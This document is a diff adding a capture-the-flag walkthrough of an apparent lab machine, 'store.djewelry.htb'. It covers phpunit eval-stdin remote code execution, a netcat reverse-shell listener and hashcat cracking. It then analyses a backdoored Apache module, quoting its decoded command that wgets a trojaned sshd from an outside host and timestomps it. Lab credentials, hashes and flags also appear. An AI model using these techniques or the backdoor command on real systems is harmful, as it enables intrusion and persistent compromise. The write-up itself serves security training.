@@ -1,0 +1,102 @@
+ip : 10.10.11.146
+Domain : store.djewelry.htb
+
+Nmap 
+----
+- nmap scan shows 2 open ports 22 and 80
+
+Enumeration
+-----------
+- checking the website, found nothing interesting 
+- browse to the store section and found a new subdomain
+- adding the store.djewelry.htb to /etc/hosts file and refreshing
+- we have a new page with login (that doesnt work)
+- nothing of interest to us here too 
+- directory bruteforcing the page with ffuf 
+- found a ton of 403 and 301 and not much 200
+- found /vendor directory, checking it reveals that phpunit is used in this website and its dated 2016, pretty unusual for a site dated as 2021
+- googling around for possible vulnerabilities in phpunit and found a github page and exploitDB explaining the exploit 
+- apparantly the phpunit 5.6 version allows attackers to run arbitrary php code through http POST method  
+
+Shell as ww-data
+----------------
+- request to the following link and intercept with burp and send it to repeater 
+
+	http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+
+- change the method to POST and add a reverse shell
+- setup  a listener with netcat 
+
+	nc -nlvp 9001
+
+- send the POST request
+- now we have a shell as www-data 
+- use find command to find all the files owned by www-data
+- use grep -v to look through the files
+
+	find / -user www-data 2>/dev/null | grep -v '/proc\|/run\|/dev\|/var/www'   
+
+- we find a backups folder 
+
+	/var/backups/info
+	
+- the info file contains hex code
+- convert it into text
+- we get a hash
+
+	$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/
+ 
+- crack the hash with hashcat
+
+	hashcat pass.hash /usr/share/wordlists/rockyou --force 
+
+creds : steven : ihatehackers
+
+Shell as steven1
+----------------
+- using the credentials ssh into the machine 
+
+	ssh steven1@10.10.11.146
+	
+- we have the shell as steven1
+- grab the user.txt
+
+	user.txt : 1b5cc4893e2acfdff55d15071254d967
+
+Priv-esc
+--------
+- now that we have a shell on the machine we can run linPeas for further enumeration 
+- we found that there is a mail from root to the steven user containing a warning on the strange behaviour of apache services
+- lets check out apache2
+- cd tp /usr/lib/apache2/modules directory and check for old files in the directory 
+- use command 
+
+	 ls --full-time -i | sort -u
+
+- we found mod_reader.so which is an older file dated back to 17-5-2021
+- open the file to check for the contents and we found a base64 encoded text
+- decode the text
+
+	echo "d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hkD" | base64 -d
+
+- decoding it gives a command
+
+	wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshdbase64: invalid input
+
+- we download the sshd folder into the attacker machine 
+- open it through ghidra
+- check for backdoor in 
+	function > a > auth > auth_password
+- copy all the lines containing backdoor 
+- arrange it in order 
+- and decode it using cyberchef 
+- swap endiannes, xor(0x96), from hex
+- and we get the password for the root 
+
+	creds : @=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3
+
+- ssh to root with the credentials 
+- grab the root flag
+	
+root flag : 1c2c3c7c42ad79c484a3fd74e19b48ae  
+
